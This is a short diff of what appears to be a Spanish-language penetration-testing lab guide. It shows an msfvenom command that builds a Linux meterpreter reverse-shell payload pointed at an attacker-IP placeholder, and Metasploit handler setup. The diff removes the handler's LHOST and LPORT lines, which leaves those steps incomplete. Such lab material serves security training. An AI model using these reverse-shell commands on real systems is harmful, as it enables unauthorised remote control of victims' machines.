@@ -417,8 +417,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f 
 # PASO 2 — Configurar handler en Metasploit (en la MISMA terminal Kali, msfconsole)
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
-set LHOST <IP_ATACANTE>
-set LPORT 4444
+
 # Lanzar en background (-j) para poder usar nc después
 exploit -j
 
